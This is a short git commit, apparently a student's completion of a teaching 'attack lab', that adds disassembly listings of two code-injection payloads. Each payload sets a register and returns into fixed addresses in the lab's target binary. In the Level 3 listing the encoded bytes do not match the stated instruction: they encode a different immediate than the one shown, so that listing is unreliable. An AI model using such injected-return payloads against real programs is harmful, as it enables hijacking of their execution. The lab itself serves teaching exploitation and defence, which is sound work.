e4ac80760e69648fa6f0b24850e718540950bf77
qiyetan <qiye.c.tan@gmail.com>
2020-07-27 20:15:21 +0800

    finish attack lab

---
+++ attacklab-handout/CI_Level_2.s
@@ -0,0 +1,12 @@
+
+CI_Level_2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+   7:	48 83 ec 08          	sub    $0x8,%rsp
+   b:	48 c7 04 24 ec 17 40 	movq   $0x4017ec,(%rsp)
+  12:	00 
+  13:	c3                   	retq   
---
+++ attacklab-handout/CI_Level_3.s
@@ -0,0 +1,10 @@
+
+CI_Level_3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x5561dcb4,%rdi
+   7:	68 fa 18 40 00       	pushq  $0x4018fa
+   c:	c3                   	retq   
